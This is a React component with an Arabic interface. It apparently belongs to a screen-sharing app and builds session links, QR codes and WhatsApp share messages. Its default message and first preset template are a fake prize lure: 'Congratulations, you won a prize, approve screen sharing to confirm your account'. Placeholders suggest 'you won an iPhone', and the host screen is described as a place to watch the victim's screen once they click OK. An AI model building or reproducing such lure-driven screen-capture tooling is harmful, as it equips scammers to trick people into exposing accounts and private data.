import React, { useState, useEffect } from 'react';
import QRCode from 'qrcode';
import { 
  Link2, 
  Copy, 
  Check, 
  Share2, 
  QrCode, 
  ArrowRight, 
  Sparkles, 
  ShieldCheck, 
  Settings2, 
  ExternalLink,
  MessageSquare,
  HelpCircle,
  Eye
} from 'lucide-react';
import type { SessionConfig } from '../types/session';

interface Props {
  onSessionCreated: (session: SessionConfig) => void;
  onOpenLegalInfo: () => void;
}

const PRESET_MESSAGES = [
  {
    label: '🎁 رسالة مفاجأة وجائزة (طلب المستخدم)',
    title: 'مبروك كسبت جائزة مميزة!',
    message: 'مبروك كسبت جائزة! لمتابعة الاستلام ومساعدتك في تأكيد الحساب يرجى الموافقة على مشاركة الشاشة لإتمام الإجراءات.',
    category: 'مكافآت وجوائز',
  },
  {
    label: '🛠️ دعم فني وإصلاح الهاتف',
    title: 'طلب جلسة دعم فني وإصلاح عطل',
    message: 'يرجى الموافقة على مشاركة شاشة هاتفك مع مهندس الدعم لمساعدتك خطوة بخطوة في حل المشكلة التقنية.',
    category: 'دعم فني',
  },
  {
    label: '📱 مساعدة في إعدادات التطبيقات',
    title: 'جلسة توجيه ومساعدة في ضبط الإعدادات',
    message: 'سأقوم بإرشادك عبر مؤشر ليزري تفاعلي لضبط إعدادات جهازك والتطبيقات بكل سهولة وبأمان تام.',
    category: 'إرشادات',
  },
  {
    label: '🎓 تدريب وشرح مباشر',
    title: 'جلسة تدريب عملي ومتابعة',
    message: 'اضغط على موافق لمشاركة الشاشة لعرض خطوات التدريب والتعلم العملي معاً.',
    category: 'تدريب',
  },
];

export const CreateSessionForm: React.FC<Props> = ({ onSessionCreated, onOpenLegalInfo }) => {
  const [title, setTitle] = useState('طلب جلسة مساعدة ومشاركة الشاشة');
  const [message, setMessage] = useState('مبروك كسبت جائزة! لمتابعة الاستلام ومساعدتك في تأكيد الحساب يرجى الموافقة على مشاركة الشاشة.');
  const [hostName, setHostName] = useState('فريق الدعم والمساعدة');
  const [allowAudio, setAllowAudio] = useState(true);
  const [allowDraw, setAllowDraw] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdSession, setCreatedSession] = useState<SessionConfig | null>(null);
  const [qrCodeDataUrl, setQrCodeDataUrl] = useState<string>('');
  const [copied, setCopied] = useState(false);

  // Generate QR code when session is ready
  useEffect(() => {
    if (createdSession) {
      const shareUrl = `${window.location.origin}${import.meta.env.BASE_URL}?session=${createdSession.id}&pin=${createdSession.pin}`;
      QRCode.toDataURL(shareUrl, { width: 320, margin: 2, color: { dark: '#020617', light: '#ffffff' } })
        .then(setQrCodeDataUrl)
        .catch(console.error);
    }
  }, [createdSession]);

  const handleCreateSession = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    const sessionId = `sess_${Math.random().toString(36).substring(2, 9)}`;
    const pin = Math.floor(100000 + Math.random() * 900000).toString();

    const payload: Partial<SessionConfig> = {
      id: sessionId,
      pin,
      title: title.trim() || 'جلسة دعم فني ومشاركة الشاشة',
      message: message.trim() || 'يرجى الموافقة على مشاركة الشاشة لتقديم المساعدة.',
      hostName: hostName.trim() || 'المساعد التقني',
      supportCategory: 'دعم مباشر',
      allowAudio,
      allowDrawAnnotations: allowDraw,
      status: 'waiting',
      createdAt: Date.now(),
    };

    try {
      const res = await fetch('/api/sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (res.ok) {
        const data: SessionConfig = await res.json();
        setCreatedSession(data);
      } else {
        // Fallback for local simulation
        setCreatedSession(payload as SessionConfig);
      }
    } catch {
      // Fallback
      setCreatedSession(payload as SessionConfig);
    } finally {
      setIsSubmitting(false);
    }
  };

  const getShareUrl = () => {
    if (!createdSession) return '';
    return `${window.location.origin}${import.meta.env.BASE_URL}?session=${createdSession.id}&pin=${createdSession.pin}`;
  };

  const handleCopyLink = () => {
    const url = getShareUrl();
    navigator.clipboard.writeText(url);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleShareWhatsApp = () => {
    const url = getShareUrl();
    const text = encodeURIComponent(`${createdSession?.title}\n\n${createdSession?.message}\n\nافتح الرابط للموافقة على الجلسة:\n${url}`);
    window.open(`https://api.whatsapp.com/send?text=${text}`, '_blank');
  };

  return (
    <div className="max-w-4xl mx-auto">
      {!createdSession ? (
        <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-xl">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-6 border-b border-slate-800/80 pb-6">
            <div>
              <div className="inline-flex items-center gap-2 px-3 py-1 bg-emerald-500/10 border border-emerald-500/30 rounded-full text-emerald-400 text-xs font-semibold mb-2">
                <Sparkles className="w-3.5 h-3.5" />
                <span>منشئ روابط الجلسات المخصصة</span>
              </div>
              <h2 className="text-2xl font-bold text-white">إنشاء رابط مشاركة شاشة مخصص</h2>
              <p className="text-sm text-slate-400 mt-1">
                اكتب أي رسالة مخصصة ترغب بإرسالها للطرف الآخر مع طلب الموافقة لمشاهدة شاشته وتوجيهه
              </p>
            </div>
            <button
              onClick={onOpenLegalInfo}
              className="flex items-center gap-2 text-xs font-medium text-slate-400 hover:text-emerald-400 bg-slate-800/80 hover:bg-slate-800 px-3 py-2 rounded-xl transition border border-slate-700/60"
            >
              <HelpCircle className="w-4 h-4 text-emerald-400" />
              <span>كيف تعمل المشاركة بأمان وقانونية؟</span>
            </button>
          </div>

          {/* Quick Presets */}
          <div className="mb-6">
            <label className="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
              نماذج ورسائل جاهزة سريعة:
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {PRESET_MESSAGES.map((preset, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => {
                    setTitle(preset.title);
                    setMessage(preset.message);
                  }}
                  className="text-right p-3 bg-slate-800/40 hover:bg-slate-800 border border-slate-700/50 hover:border-emerald-500/50 rounded-xl transition group"
                >
                  <div className="text-xs font-bold text-slate-200 group-hover:text-emerald-300">
                    {preset.label}
                  </div>
                  <div className="text-xs text-slate-400 truncate mt-1">
                    {preset.message}
                  </div>
                </button>
              ))}
            </div>
          </div>

          <form onSubmit={handleCreateSession} className="space-y-5">
            <div>
              <label className="block text-sm font-semibold text-slate-300 mb-1.5">
                عنوان الدعوة أو الطلب (يظهر أعلى شاشة الطرف الآخر)
              </label>
              <input
                type="text"
                value={title}
                onChange={(e) => setTitle(e.target.value)}
                placeholder="مثال: مبروك كسبت ايفون / طلب مساعدة تقنية"
                className="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500 transition"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-semibold text-slate-300 mb-1.5">
                الرسالة المكتوبة التي ستصل إليه (يمكنك كتابة ما تريد):
              </label>
              <textarea
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                rows={3}
                placeholder="اكتب هنا النص الذي تريده مثل: مبروك كسبت كيس قلبظ دوس علي الزرار للاستلام..."
                className="w-full bg-slate-950 border border-slate-700 rounded-xl p-4 text-white text-sm focus:outline-none focus:border-emerald-500 transition resize-none"
                required
              />
              <p className="text-xs text-slate-500 mt-1">
                عند فتح الطرف الآخر للرابط سيرى هذه الرسالة بالكامل متبوعة بزر للموافقة على مشاركة شاشته لبدء الجلسة.
              </p>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-semibold text-slate-300 mb-1.5">
                  اسمك أو اسم الجهة الطالبة
                </label>
                <input
                  type="text"
                  value={hostName}
                  onChange={(e) => setHostName(e.target.value)}
                  placeholder="مثال: محمد علاء / الدعم الفني"
                  className="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-2.5 text-white text-sm focus:outline-none focus:border-emerald-500 transition"
                />
              </div>

              <div className="flex flex-col justify-end space-y-2">
                <label className="flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={allowDraw}
                    onChange={(e) => setAllowDraw(e.target.checked)}
                    className="w-4 h-4 accent-emerald-500 rounded"
                  />
                  <span>تفعيل التوجيه بالليزر والرسم على الشاشة</span>
                </label>
                <label className="flex items-center gap-2 text-sm text-slate-300 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={allowAudio}
                    onChange={(e) => setAllowAudio(e.target.checked)}
                    className="w-4 h-4 accent-emerald-500 rounded"
                  />
                  <span>السماح بقناة اتصال صوتي مع مشاركة الشاشة</span>
                </label>
              </div>
            </div>

            <div className="pt-4 border-t border-slate-800">
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-emerald-600 hover:bg-emerald-500 active:scale-[0.99] text-white font-bold py-3.5 px-6 rounded-xl transition shadow-lg shadow-emerald-950/50 flex items-center justify-center gap-2 disabled:opacity-50"
              >
                <Link2 className="w-5 h-5" />
                <span>{isSubmitting ? 'جاري تجهيز الرابط...' : 'إنشاء وتوليد الرابط الآن'}</span>
              </button>
            </div>
          </form>
        </div>
      ) : (
        /* Generated Link and Session Screen */
        <div className="bg-slate-900 border border-emerald-500/40 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden animate-in zoom-in-95 duration-200">
          <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none -mr-20 -mt-20"></div>

          <div className="flex items-center justify-between border-b border-slate-800 pb-5 mb-6">
            <div>
              <span className="px-3 py-1 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-full text-xs font-bold inline-block mb-2">
                تم تجهيز الرابط بنجاح 🎉
              </span>
              <h2 className="text-2xl font-black text-white">رابط الجلسة جاهز للمشاركة</h2>
            </div>
            <button
              onClick={() => setCreatedSession(null)}
              className="text-xs text-slate-400 hover:text-white px-3 py-1.5 rounded-lg border border-slate-700 bg-slate-800/60"
            >
              + إنشاء رابط جديد
            </button>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-center">
            {/* Left/Main Column: URL and actions */}
            <div className="md:col-span-8 space-y-4">
              <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800">
                <span className="text-xs text-slate-400 font-medium block mb-1">الرابط المباشر للطرف الآخر:</span>
                <div className="flex items-center gap-2">
                  <input
                    type="text"
                    readOnly
                    value={getShareUrl()}
                    className="w-full bg-transparent text-emerald-400 text-sm font-mono focus:outline-none select-all"
                  />
                  <button
                    onClick={handleCopyLink}
                    className="px-3 py-2 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 transition shrink-0"
                  >
                    {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    <span>{copied ? 'تم النسخ!' : 'نسخ'}</span>
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-slate-800/50 p-3 rounded-xl border border-slate-700/50">
                  <span className="text-xs text-slate-400 block">رمز الجلسة السريع (PIN):</span>
                  <span className="text-xl font-black text-white font-mono tracking-wider">{createdSession.pin}</span>
                </div>
                <div className="bg-slate-800/50 p-3 rounded-xl border border-slate-700/50">
                  <span className="text-xs text-slate-400 block">العنوان الظاهر للطرف الآخر:</span>
                  <span className="text-sm font-bold text-slate-200 truncate block">{createdSession.title}</span>
                </div>
              </div>

              <div className="bg-slate-800/30 p-3.5 rounded-xl border border-slate-800 text-xs text-slate-300">
                <strong className="text-emerald-400 block mb-1">نص الرسالة التي ستظهر له عند فتح الرابط:</strong>
                &quot;{createdSession.message}&quot;
              </div>

              <div className="flex flex-wrap gap-2 pt-2">
                <button
                  onClick={handleShareWhatsApp}
                  className="flex-1 bg-emerald-600/90 hover:bg-emerald-600 text-white font-bold py-2.5 px-4 rounded-xl text-sm flex items-center justify-center gap-2 transition"
                >
                  <Share2 className="w-4 h-4" />
                  <span>مشاركة عبر واتساب</span>
                </button>
                <a
                  href={getShareUrl()}
                  target="_blank"
                  rel="noreferrer"
                  className="flex-1 bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 font-semibold py-2.5 px-4 rounded-xl text-sm flex items-center justify-center gap-2 transition"
                >
                  <ExternalLink className="w-4 h-4" />
                  <span>فتح في تبويب آخر للتجربة</span>
                </a>
              </div>
            </div>

            {/* Right Column: QR Code */}
            <div className="md:col-span-4 flex flex-col items-center justify-center p-4 bg-slate-950/60 rounded-2xl border border-slate-800/80 text-center">
              <span className="text-xs text-slate-400 font-medium mb-2 flex items-center gap-1.5">
                <QrCode className="w-4 h-4 text-emerald-400" />
                <span>امسح بكاميرا الهاتف للمعاينة:</span>
              </span>
              {qrCodeDataUrl ? (
                <div className="p-2 bg-white rounded-xl shadow-lg">
                  <img src={qrCodeDataUrl} alt="QR Code" className="w-36 h-36" />
                </div>
              ) : (
                <div className="w-36 h-36 bg-slate-800 animate-pulse rounded-xl" />
              )}
              <span className="text-[11px] text-slate-500 mt-2">
                افتح الكاميرا على أي هاتف للموافقة على المشاركة
              </span>
            </div>
          </div>

          {/* Action to enter Host Dashboard to watch */}
          <div className="mt-8 pt-6 border-t border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-4">
            <div className="text-right">
              <h4 className="font-bold text-white text-base">هل أرسلت الرابط وتريد انتظار شاشته؟</h4>
              <p className="text-xs text-slate-400">
                ادخل الآن إلى غرفة التحكم والمشاهدة لمراقبة متى يضغط على &quot;موافق&quot; وعرض شاشته فوراً
              </p>
            </div>
            <button
              onClick={() => onSessionCreated(createdSession)}
              className="w-full sm:w-auto bg-gradient-to-r from-blue-600 to-emerald-600 hover:from-blue-500 hover:to-emerald-500 text-white font-bold py-3 px-8 rounded-xl transition shadow-lg flex items-center justify-center gap-2"
            >
              <Eye className="w-5 h-5" />
              <span>دخول شاشة المشاهدة والتحكم (Host Dashboard)</span>
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
